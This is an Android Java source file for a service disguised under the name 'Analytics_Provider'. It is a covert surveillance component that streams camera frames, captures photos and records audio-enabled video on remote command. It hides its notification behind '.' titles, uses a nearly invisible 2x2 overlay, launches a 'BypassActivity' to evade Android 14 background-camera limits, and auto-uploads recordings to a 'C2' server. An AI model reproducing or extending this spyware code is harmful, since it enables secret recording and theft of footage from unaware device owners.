package com.labs.labrats;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.camera.camera2.interop.Camera2Interop;
import androidx.camera.camera2.interop.Camera2CameraInfo;
import androidx.camera.core.Camera;
import androidx.camera.core.CameraInfo;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.video.FileOutputOptions;
import androidx.camera.video.Quality;
import androidx.camera.video.QualitySelector;
import androidx.camera.video.Recorder;
import androidx.camera.video.Recording;
import androidx.camera.video.VideoCapture;
import androidx.camera.video.VideoRecordEvent;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@androidx.camera.camera2.interop.ExperimentalCamera2Interop
public class Analytics_Provider extends Service implements LifecycleOwner {
    private static final String TAG = "Analytics_Provider";
    private static final String CHANNEL_ID = "Analytics_ProviderChannel";
    private static final int NOTIFICATION_ID = 2002;

    private LifecycleRegistry lifecycleRegistry;
    private ProcessCameraProvider cameraProvider;
    private Preview preview;
    private ImageAnalysis imageAnalysis;
    private ImageCapture imageCapture;
    private VideoCapture<Recorder> videoCapture;
    private Recording currentRecording;
    private Camera camera;

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private volatile boolean surfaceReady = false;
    private CountDownLatch surfaceLatch;

    private ExecutorService cameraExecutor;
    private static Analytics_Provider instance;

    // State trackers
    private static volatile boolean isStreaming = false;
    private static volatile boolean isRecording = false;
    private static volatile boolean captureInProgress = false;
    private static volatile boolean reinitPending = false;
    private static volatile String currentCameraId = "0";
    private static volatile int streamWidth = 640;
    private static volatile int streamHeight = 480;
    private static volatile int streamQuality = 50;
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
    private final Handler cameraHandler = new Handler(Looper.getMainLooper());
    private static volatile byte[] latestFrame = null;
    private static volatile byte[] lastCapturedPhoto = null;
    private static volatile String lastCaptureError = null;
    private static CountDownLatch captureLatch;
    private static String currentVideoPath = null;
    private static String lastFinishedVideoPath = null;
    private static long recordingStartTime = 0;
    private static volatile boolean nightModeEnabled = false;

    public static Analytics_Provider getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        lifecycleRegistry = new LifecycleRegistry(this);
        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
        // [PERFORMANCE_SYNC] Use a fixed thread pool to prevent analysis from blocking recording/C2 comms
        cameraExecutor = Executors.newFixedThreadPool(4);
        
        createNotificationChannel();
        ensureForeground();
        createOverlay();
        
        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("night_mode", false);
        
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                cameraProvider = cameraProviderFuture.get();
                // Core hardware ready
                Log.d(TAG, "CameraProvider initialized successfully.");
            } catch (Exception e) {
                Log.e(TAG, "CameraX Init Error: " + e.getMessage());
            }
        }, ContextCompat.getMainExecutor(this));
    }

    @NonNull
    @Override
    public Lifecycle getLifecycle() { return lifecycleRegistry; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ensureForeground();
        if (intent != null) {
            String action = intent.getAction();
            if (Constants.ACTION_START_STREAM.equals(action)) {
                startStreaming(intent.getStringExtra("cameraId"), 
                             intent.getIntExtra("width", 640), 
                             intent.getIntExtra("height", 480), 
                             intent.getIntExtra("quality", 50));
            } else if (Constants.ACTION_STOP_STREAM.equals(action)) {
                stopStreaming();
            } else if (Constants.ACTION_CAPTURE_PHOTO.equals(action)) {
                capturePhotoBackground(intent.getStringExtra("cameraId"));
            } else if (Constants.ACTION_START_RECORDING.equals(action)) {
                startVideoRecording(intent.getStringExtra("cameraId"), 
                                  intent.getIntExtra("width", 1280), 
                                  intent.getIntExtra("height", 720));
            } else if (Constants.ACTION_STOP_RECORDING.equals(action)) {
                stopVideoRecording();
            } else if (Constants.ACTION_STOP_OPTICS.equals(action) || "STOP".equals(action)) {
                shutdown();
            }
        }
        return START_STICKY;
    }

    private void ensureForeground() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(".")
                .setContentText(".")
                .setSmallIcon(R.drawable.ic_sprocket_gear)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            if (isRecording && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            }
            startForeground(NOTIFICATION_ID, notification, serviceType);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
    public void startStreaming(String cameraId, int width, int height, int quality) {
        if (cameraProvider == null) {
            Log.e(TAG, "OPTICS_ERROR: CameraProvider not ready. Deferring stream...");
            return;
        }
        
        Log.d(TAG, "OPTICS_INIT: startStreaming(" + cameraId + ")");

        if (isStreaming && cameraId != null && cameraId.equals(currentCameraId)) {
            streamWidth = width;
            streamHeight = height;
            streamQuality = quality;
            Log.d(TAG, "OPTICS_UPDATE: Quality updated in-flight (" + width + "x" + height + " q=" + quality + ")");
            return;
        }

        // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                startActivity(bypass);
            } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
        }

        cameraHandler.removeCallbacksAndMessages(null);
        cameraHandler.post(() -> {
            try {
                // --- 1. UNBIND PREVIOUS USE CASES ---
                isStreaming = false;
                frameQueue.clear();
                if (cameraProvider != null) {
                    cameraProvider.unbindAll();
                }
                
                // Breath time for Samsung Camera2 HAL (100ms for instantaneous switching)
                cameraHandler.postDelayed(() -> {
                    try {
                        currentCameraId = cameraId;
                        streamWidth = width;
                        streamHeight = height;
                        streamQuality = quality;
                        streamQuality = quality;
                        
                        createOverlay();

                        // --- 2. BUILD USE CASES ---
                        int targetRotation = Surface.ROTATION_0;
                        try {
                            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
                        } catch (Exception ignored) {}

                        ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
                                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                                .setTargetRotation(targetRotation)
                                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);

                        imageAnalysis = analysisBuilder.build();
                        imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                            if (!isStreaming) { image.close(); return; }
                            try {
                                // [STABILITY_SYNC] Apply rotation degrees from ImageInfo to fix sideways feed
                                int rotation = image.getImageInfo().getRotationDegrees();
                                Bitmap bitmap = image.toBitmap();
                                
                                if (bitmap != null) {
                                    if (rotation != 0) {
                                        Matrix matrix = new Matrix();
                                        matrix.postRotate(rotation);
                                        Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                                        bitmap.recycle();
                                        bitmap = rotated;
                                    }

                                    if (nightModeEnabled) {
                                        try {
                                            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                                            android.graphics.Paint paint = new android.graphics.Paint();
                                            android.graphics.ColorMatrix cm = new android.graphics.ColorMatrix(new float[] {
                                                2.2f, 0,    0,    0, 25f,
                                                0,    2.2f, 0,    0, 25f,
                                                0,    0,    2.2f, 0, 25f,
                                                0,    0,    0,    1.0f, 0f
                                            });
                                            paint.setColorFilter(new android.graphics.ColorMatrixColorFilter(cm));
                                            canvas.drawBitmap(bitmap, 0, 0, paint);
                                        } catch (Exception ignored) {}
                                    }
                                    
                                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                                    bitmap.compress(Bitmap.CompressFormat.JPEG, streamQuality, out);
                                    byte[] jpegData = out.toByteArray();
                                    latestFrame = jpegData;
                                    if (frameQueue.size() >= 5) frameQueue.poll();
                                    frameQueue.offer(jpegData);
                                    bitmap.recycle();
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Analysis Error: " + e.getMessage());
                            } finally { image.close(); }
                        });

                        CameraSelector selector = getCameraSelector(cameraId);
                        preview = new Preview.Builder().build();
                        preview.setSurfaceProvider(ContextCompat.getMainExecutor(this), request -> {
                            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
                                request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
                                return;
                            }
                            
                            // Hardware surface might not be ready yet
                            LabRatsWorker.execute(() -> {
                                try {
                                    if (surfaceLatch != null) surfaceLatch.await(5, TimeUnit.SECONDS);
                                } catch (Exception ignored) {}
                                
                                new Handler(Looper.getMainLooper()).post(() -> {
                                    if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
                                        request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
                                    } else {
                                        request.willNotProvideSurface();
                                    }
                                });
                            });
                        });

                        // --- 3. SYNCHRONIZED BINDING ---
                        List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
                        useCases.add(preview);
                        useCases.add(imageAnalysis);
                        
                        // [STABILITY_SYNC] If already recording, ensure VideoCapture stays bound
                        if (isRecording && videoCapture != null) {
                            useCases.add(videoCapture);
                        }

                        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
                        camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                        
                        // Apply Night Mode Exposure Compensation EV boost
                        if (camera != null && nightModeEnabled) {
                            try {
                                int maxEv = camera.getCameraInfo().getExposureState().getExposureCompensationRange().getUpper();
                                if (maxEv > 0) camera.getCameraControl().setExposureCompensationIndex(maxEv);
                            } catch (Exception ignored) {}
                        }

                        // Promotion to RESUMED ensures highest priority for background processing
                        lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);
                        
                        isStreaming = true;
                        ensureForeground();
                        Log.d(TAG, "OPTICS_SUCCESS: Stream active.");
                    } catch (Exception e) {
                        Log.e(TAG, "Binding Error: " + e.getMessage());
                        isStreaming = false;
                    }
                }, 100); 

            } catch (Exception e) {
                Log.e(TAG, "Sync Error: " + e.getMessage());
            }
        });
    }

    private CameraSelector getCameraSelector(String cameraId) {
        if ("1".equals(cameraId)) return CameraSelector.DEFAULT_FRONT_CAMERA;
        if (cameraId != null && !cameraId.equals("0")) {
            return new CameraSelector.Builder()
                    .addCameraFilter(cameraInfos -> {
                        for (CameraInfo c : cameraInfos) {
                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                return Collections.singletonList(c);
                            }
                        }
                        return Collections.emptyList();
                    }).build();
        }
        return CameraSelector.DEFAULT_BACK_CAMERA;
    }

    private void createOverlay() {
        if (surfaceView != null) {
            return;
        }

        surfaceReady = false;
        surfaceLatch = new CountDownLatch(1);

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (surfaceView != null) return;
                
                windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                surfaceView = new SurfaceView(this);

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        2, 2,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003, // 2003 = TYPE_SYSTEM_ALERT
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                params.alpha = 0.01f;

                surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(@NonNull SurfaceHolder holder) {
                        surfaceReady = true;
                        if (surfaceLatch != null) surfaceLatch.countDown();
                    }
                    @Override public void surfaceChanged(@NonNull SurfaceHolder holder, int f, int w, int h) {}
                    @Override public void surfaceDestroyed(@NonNull SurfaceHolder holder) { 
                        surfaceReady = false; 
                    }
                });

                windowManager.addView(surfaceView, params);
            } catch (Exception e) {
                Log.e(TAG, "Overlay Error: " + e.getMessage());
                if (surfaceLatch != null) surfaceLatch.countDown();
            }
        });
    }

    private void removeOverlay() {
        if (windowManager != null && surfaceView != null) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    windowManager.removeView(surfaceView);
                } catch (Exception ignored) {}
                surfaceView = null;
                windowManager = null;
                surfaceReady = false;
            });
        }
    }

    public void capturePhotoBackground(String cameraId) {
        if (cameraProvider == null || captureInProgress) return;
        captureInProgress = true;
        captureLatch = new CountDownLatch(1);
        lastCapturedPhoto = null;

        int targetRotation = Surface.ROTATION_0;
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
        } catch (Exception ignored) {}

        imageCapture = new ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .setTargetRotation(targetRotation)
                .build();

        CameraSelector selector;
        if ("1".equals(cameraId)) {
            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
        } else if (cameraId != null && !cameraId.equals("0")) {
            selector = new CameraSelector.Builder()
                    .addCameraFilter(cameraInfos -> {
                        for (CameraInfo c : cameraInfos) {
                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                return Collections.singletonList(c);
                            }
                        }
                        return Collections.emptyList();
                    }).build();
        } else {
            selector = CameraSelector.DEFAULT_BACK_CAMERA;
        }

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                // [STABILITY_SYNC] Maintain existing stream/recording to prevent freezing
                List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
                useCases.add(imageCapture);
                if (isStreaming) {
                    if (preview != null) useCases.add(preview);
                    if (imageAnalysis != null) useCases.add(imageAnalysis);
                }
                if (isRecording && videoCapture != null) {
                    useCases.add(videoCapture);
                }

                cameraProvider.unbindAll();
                camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                
                imageCapture.takePicture(cameraExecutor, new ImageCapture.OnImageCapturedCallback() {
                    @Override
                    public void onCaptureSuccess(@NonNull ImageProxy image) {
                        try {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] data = new byte[buffer.remaining()];
                            buffer.get(data);
                            
                            // [STABILITY_SYNC] Apply rotation degrees to captured photo
                            int rotation = image.getImageInfo().getRotationDegrees();
                            if (rotation != 0) {
                                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                                if (bitmap != null) {
                                    Matrix matrix = new Matrix();
                                    matrix.postRotate(rotation);
                                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                                    rotated.compress(Bitmap.CompressFormat.JPEG, 95, out);
                                    data = out.toByteArray();
                                    bitmap.recycle();
                                    rotated.recycle();
                                }
                            }
                            lastCapturedPhoto = data;
                        } finally {
                            image.close();
                            captureInProgress = false;
                            captureLatch.countDown();
                            new Handler(Looper.getMainLooper()).post(() -> {
                                if (isStreaming) {
                                    startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
                                } else if (!isRecording) {
                                    if (cameraProvider != null) cameraProvider.unbindAll();
                                    ensureForeground();
                                }
                            });
                        }
                    }

                    @Override
                    public void onError(@NonNull ImageCaptureException exception) {
                        lastCaptureError = exception.getMessage();
                        captureInProgress = false;
                        captureLatch.countDown();
                        new Handler(Looper.getMainLooper()).post(() -> {
                            if (isStreaming) {
                                startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
                            } else if (!isRecording) {
                                if (cameraProvider != null) cameraProvider.unbindAll();
                                ensureForeground();
                            }
                        });
                    }
                });
            } catch (Exception e) {
                captureInProgress = false;
                captureLatch.countDown();
            }
        });
    }

    public void startVideoRecording(String cameraId, int width, int height) {
        if (cameraProvider == null || isRecording) return;

        Quality quality = Quality.HD; // Default 720p
        if (width >= 3840 || height >= 2160) quality = Quality.UHD;
        else if (width >= 1920 || height >= 1080) quality = Quality.FHD;
        else if (width <= 640) quality = Quality.SD;

        int targetRotation = Surface.ROTATION_0;
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
        } catch (Exception ignored) {}

        Recorder recorder = new Recorder.Builder()
                .setExecutor(cameraExecutor)
                .setQualitySelector(QualitySelector.from(quality))
                .build();
        videoCapture = VideoCapture.withOutput(recorder);
        videoCapture.setTargetRotation(targetRotation);

        CameraSelector selector;
        if ("1".equals(cameraId)) {
            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
        } else if (cameraId != null && !cameraId.equals("0")) {
            selector = new CameraSelector.Builder()
                    .addCameraFilter(cameraInfos -> {
                        for (CameraInfo c : cameraInfos) {
                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                return Collections.singletonList(c);
                            }
                        }
                        return Collections.emptyList();
                    }).build();
        } else {
            selector = CameraSelector.DEFAULT_BACK_CAMERA;
        }
        
        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "LabRATS-Security");
        if (!videoDir.exists()) videoDir.mkdirs();
        File videoFile = new File(videoDir, "VID_" + System.currentTimeMillis() + ".mp4");
        currentVideoPath = videoFile.getAbsolutePath();

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                // [STABILITY_SYNC] To prevent freezing, we must bind ALL active use cases together.
                // If streaming, include imageAnalysis and preview in the binding.
                List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
                useCases.add(videoCapture);
                
                if (isStreaming) {
                    if (preview != null) useCases.add(preview);
                    if (imageAnalysis != null) useCases.add(imageAnalysis);
                } else {
                    createOverlay();
                    if (preview != null) useCases.add(preview);
                }

                cameraProvider.unbindAll();
                camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                
                FileOutputOptions options = new FileOutputOptions.Builder(videoFile).build();
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return;
                
                currentRecording = videoCapture.getOutput().prepareRecording(this, options)
                        .withAudioEnabled()
                        .start(ContextCompat.getMainExecutor(this), event -> {
                            if (event instanceof VideoRecordEvent.Start) {
                                isRecording = true;
                                recordingStartTime = System.currentTimeMillis();
                                FirebaseConfig.logActivity("OPTICS_VIDEO: Recording started");
                            } else if (event instanceof VideoRecordEvent.Finalize) {
                                isRecording = false;
                                lastFinishedVideoPath = currentVideoPath;
                                // [STABILITY_SYNC] Auto-upload to C2 on completion
                                VideoRecordEvent.Finalize finalizeEvent = (VideoRecordEvent.Finalize) event;
                                if (!finalizeEvent.hasError()) {
                                    C2_Uploader.uploadFile(Analytics_Provider.this, videoFile);
                                }
                                
                                new Handler(Looper.getMainLooper()).post(() -> {
                                    if (isStreaming) {
                                        // [STABILITY_SYNC] Restart stream to release VideoCapture resources
                                        startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
                                    } else {
                                        if (cameraProvider != null) cameraProvider.unbindAll();
                                        removeOverlay();
                                        ensureForeground();
                                    }
                                });
                            }
                        });
            } catch (Exception e) {
                Log.e(TAG, "Video Init Error: " + e.getMessage());
                isRecording = false;
            }
        });
    }

    public void stopVideoRecording() {
        if (currentRecording != null) {
            currentRecording.stop();
            currentRecording = null;
            // State is reset in the VideoRecordEvent.Finalize listener
        }
    }

    public void stopStreaming() {
        isStreaming = false;
        frameQueue.clear();
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (!isRecording) {
                    if (cameraProvider != null) {
                        cameraProvider.unbindAll();
                    }
                } else if (imageAnalysis != null) {
                    // [STABILITY_SYNC] If recording, only unbind analysis to keep video alive
                    cameraProvider.unbind(imageAnalysis);
                }
            } catch (Exception ignored) {}
            ensureForeground(); // Force indicator reset
        });
    }

    private void shutdown() {
        isStreaming = false;
        isRecording = false;
        captureInProgress = false;
        
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (cameraProvider != null) {
                    cameraProvider.unbindAll();
                }
            } catch (Exception ignored) {}
            
            if (currentRecording != null) {
                currentRecording.stop();
                currentRecording = null;
            }
            
            removeOverlay();
            lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
            stopForeground(true);
            stopSelf();
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, ".", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override public void onDestroy() { 
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
        cameraExecutor.shutdown();
        instance = null;
        super.onDestroy(); 
    }

    // Static Accessors preserved for existing UI compatibility
    public static boolean isCurrentlyStreaming() { return isStreaming; }
    public static boolean isInitializing() { return reinitPending; }
    public static byte[] getNextFrame(long timeout) {
        try {
            byte[] frame = frameQueue.poll(timeout, TimeUnit.MILLISECONDS);
            if (frame != null && frame.length > 100) {
                latestFrame = frame;
                return frame;
            }
        } catch (Exception ignored) {}
        return latestFrame;
    }
    public static byte[] waitForPhoto(long timeout) { 
        if (captureLatch != null) try { captureLatch.await(timeout, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
        return lastCapturedPhoto; 
    }
    public static String getLastCaptureError() { return lastCaptureError; }
    public static boolean isCaptureInProgress() { return captureInProgress; }
    public static String getCurrentCameraId() { return currentCameraId; }
    public static int getStreamWidth() { return streamWidth; }
    public static int getStreamHeight() { return streamHeight; }
    public static boolean isCurrentlyRecording() { return isRecording; }
    public static String getCurrentVideoPath() { return currentVideoPath; }
    public static String getLastFinishedVideoPath() { return lastFinishedVideoPath; }
    public static long getRecordingDuration() { return isRecording ? (System.currentTimeMillis() - recordingStartTime) / 1000 : 0; }
    public static boolean isNightModeEnabled(Context c) { return nightModeEnabled; }
    
    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
    public void setNightMode(boolean e) { 
        nightModeEnabled = e; 
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("night_mode", e).apply();
        Log.d(TAG, "OPTICS_PROTOCOL: Nightmode set to " + e);

        if (camera != null) {
            try {
                if (nightModeEnabled) {
                    int maxEv = camera.getCameraInfo().getExposureState().getExposureCompensationRange().getUpper();
                    if (maxEv > 0) camera.getCameraControl().setExposureCompensationIndex(maxEv);
                } else {
                    camera.getCameraControl().setExposureCompensationIndex(0);
                }
            } catch (Exception ex) {
                Log.e(TAG, "Nightmode EV Toggle Error: " + ex.getMessage());
            }
        }
    }
    public void setFlashMode(boolean on) { if (camera != null) camera.getCameraControl().enableTorch(on); }

    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}
